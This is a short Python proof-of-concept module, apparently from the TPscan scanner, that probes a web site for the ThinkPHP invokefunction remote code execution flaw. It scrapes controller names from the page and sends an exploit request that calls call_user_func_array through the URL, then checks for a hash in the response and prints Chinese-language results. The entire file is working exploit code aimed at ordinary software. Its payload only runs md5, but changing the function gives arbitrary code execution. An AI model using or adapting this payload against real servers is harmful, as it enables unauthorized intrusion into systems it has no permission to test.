#!/usr/bin/env python
# coding=utf-8
import re
import urllib
import requests
import urllib3
from termcolor import colored

urllib3.disable_warnings()


def thinkphp_invoke_func_code_exec_verify(url):
    """thinkphp_invoke_func_code_exec_verify"""
    pocdict = {
        "vulnname": "thinkphp_invoke_func_code_exec",
        "isvul": False,
        "vulnurl": "",
        "payload": "",
        "proof": "",
        "response": "",
        "exception": "",
    }
    headers = {
        "User-Agent": 'TPscan',
    }
    controllers = list()
    req = requests.get(url, headers=headers, timeout=15, verify=False)
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        controllers.append(match.split('/')[1])
    controllers.append('index')
    controllers = list(set(controllers))
    status = 0
    for controller in controllers:
        try:
            payload = 'index.php?s={0}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=2333'.format(controller)
            vurl = urllib.parse.urljoin(url, payload)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False)
            if r"56540676a129760a3" in req.text:
                pocdict['isvul'] = True
                pocdict['vulnurl'] = vurl
                pocdict['proof'] = '56540676a129760a3'
                pocdict['response'] = req.status_code
                print(colored("[+] 目标存在 thinkphp_invoke_func_code_exec 漏洞\tpayload: ", "green"))
                print(colored(pocdict, 'green'))
                status = 1
        except:
            pass
    if status == 0:
        print(colored("\n[*] 目标不存在 thinkphp_invoke_func_code_exec 漏洞", "red"))
